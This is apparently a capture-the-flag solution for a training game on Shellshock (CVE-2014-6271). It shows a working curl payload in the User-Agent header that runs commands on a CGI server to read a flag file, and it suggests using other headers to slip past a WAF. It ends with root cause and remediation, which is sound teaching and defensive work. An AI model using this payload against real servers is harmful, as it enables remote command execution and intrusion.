# Solution — Game 2: Shellshock (CVE-2014-6271)

## 1. Recon

Confirm the CGI script is reachable and behaves normally:

```bash
curl -s http://cyberrange-target/cgi-bin/status.cgi
```

Expected output:

```
Server status: OK
Uptime check: nominal
```

## 2. Exploit

Shellshock abuses the fact that Apache's `mod_cgi`/`mod_cgid` copies HTTP
request headers into environment variables before invoking the CGI script's
interpreter. If that interpreter is a vulnerable `bash`, a header value
shaped like a function definition followed by extra commands causes bash to
execute those extra commands immediately, during environment setup — before
the CGI script itself even runs.

Send a crafted `User-Agent` header:

```bash
curl -s -H 'User-Agent: () { :; }; echo; echo; /bin/cat /opt/flag.txt' \
  http://cyberrange-target/cgi-bin/status.cgi
```

Expected output:

```
WMG{sh3llsh0ck_cve_2014_6271_env_vars_are_scary}
```

The two `echo;` calls exist to emit a blank line, which keeps the CGI
response looking like a well-formed HTTP body (headers, blank line, body) so
the server doesn't choke on the malformed response — in practice `curl -s`
will show the flag either way, but it's good practice when writing the
payload.

Any HTTP header that gets forwarded into the CGI environment works the same
way — `Referer` and `Cookie` are common alternates if a WAF happens to be
filtering `User-Agent`.

## 3. Confirm there's no other way in

The flag deliberately lives outside the web root (`/opt/flag.txt`, not under
`/var/www`), so it cannot be fetched by any direct URL:

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://cyberrange-target/flag.txt
# -> 404
```

The *only* path to it is arbitrary command execution via the CGI
environment-injection bug.

## Why this works (root cause)

- `status.cgi`'s shebang points at a **build of bash 4.3 predating the 2014
  Shellshock patches**, deployed side-by-side with the system's normal
  (patched) `/bin/bash` at `/usr/local/bin/bash-vulnerable`. This mirrors a
  common real-world failure mode: the OS package manager keeps `/bin/bash`
  patched, but a legacy script was pinned to a specific old interpreter and
  nobody re-audited it after the CVE was announced.
- Apache's `mod_cgi`/`mod_cgid` exposes attacker-controlled HTTP headers as
  environment variables to the CGI process, and the vulnerable bash executes
  trailing shell commands appended after a function-definition-shaped
  environment variable value, rather than stopping at the end of the
  function body as it should.
- The web server process (`www-data`) has read access to `/opt/flag.txt`,
  so any command it's tricked into running can read it.

## Remediation

- Never pin a script to a specific old interpreter binary "for compatibility"
  without a plan to keep it patched.
- Patch `bash` (or migrate off CGI scripts written in shell entirely — most
  modern deployments avoid `mod_cgi` altogether).
- Principle of least privilege: the web server user should not have read
  access to files it has no legitimate reason to serve.
- Use a WAF or input validation layer that rejects header values containing
  shell metacharacters as defense in depth (not a substitute for patching).
